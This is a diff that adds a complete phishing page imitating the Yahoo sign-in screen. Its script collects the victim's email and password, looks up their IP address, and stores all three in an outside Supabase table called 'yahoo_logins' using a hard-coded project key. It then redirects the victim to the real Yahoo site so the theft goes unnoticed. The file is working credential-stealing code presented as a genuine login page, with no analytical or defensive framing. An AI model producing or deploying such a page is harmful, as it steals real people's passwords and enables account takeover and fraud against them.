@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Yahoo Login</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+    background: #f3f4f6;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+.top-bar {
+    display: flex;
+    justify-content: space-between;
+    padding: 15px 30px;
+    background: white;
+    border-bottom: 1px solid #ddd;
+}
+
+.logo {
+    color: #6001d2;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.container {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-box {
+    background: white;
+    width: 380px;
+    padding: 40px 30px;
+    border-radius: 10px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+    text-align: center;
+}
+
+h2 {
+    margin-bottom: 10px;
+}
+
+p {
+    margin-bottom: 20px;
+    color: #666;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 16px;
+}
+
+input:focus {
+    outline: none;
+    border-color: #6001d2;
+}
+
+.btn {
+    width: 100%;
+    padding: 12px;
+    background: #6001d2;
+    color: white;
+    border: none;
+    border-radius: 25px;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 10px;
+}
+
+.btn:hover {
+    background: #4b00a8;
+}
+
+.btn:disabled {
+    background: #999;
+    cursor: not-allowed;
+}
+
+.link {
+    text-align: left;
+    margin-top: 15px;
+    font-size: 14px;
+}
+
+.link a {
+    color: #6001d2;
+    text-decoration: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="top-bar">
+    <div class="logo">yahoo!</div>
+</div>
+
+<div class="container">
+    <div class="login-box">
+        <h2>Sign in</h2>
+        <p>using your Yahoo account</p>
+
+        <input type="email" id="email" placeholder="Email address or username">
+        <input type="password" id="password" placeholder="Password">
+
+        <button class="btn" id="loginBtn">LOGIN</button>
+
+        <div class="link">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+</div>
+
+<script>
+// Supabase configuration
+const supabaseUrl = 'https://tbdeofcwnqfaipkwbwvw.supabase.co';
+const supabaseKey = 'sb_publishable_qp6gYArW7JNkXwHpob8YuQ_9W0WNoYC';
+const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+
+// Get elements
+const loginBtn = document.getElementById('loginBtn');
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+
+// Handle login
+loginBtn.addEventListener('click', async function() {
+    const email = emailInput.value;
+    const password = passwordInput.value;
+    
+    if(email === "") {
+        alert("Please enter your email");
+        return;
+    }
+    
+    if(password === "") {
+        alert("Please enter your password");
+        return;
+    }
+    
+    // Change button text
+    loginBtn.innerHTML = 'SIGNING IN...';
+    loginBtn.disabled = true;
+    
+    // Get IP address
+    let ipAddress = "Not available";
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip;
+    } catch(e) {
+        // Ignore IP errors
+    }
+    
+    // Save to Supabase
+    const { error } = await supabaseClient
+        .from('yahoo_logins')
+        .insert([
+            { 
+                email: email,
+                password: password,
+                ip_address: ipAddress,
+                location: "Yahoo Login"
+            }
+        ]);
+    
+    if (error) {
+        alert("Error: " + error.message);
+        loginBtn.innerHTML = 'LOGIN';
+        loginBtn.disabled = false;
+    } else {
+        // Redirect directly to Yahoo
+        window.location.href = "https://www.yahoo.com/";
+    }
+});
+</script>
+
+</body>
+</html>
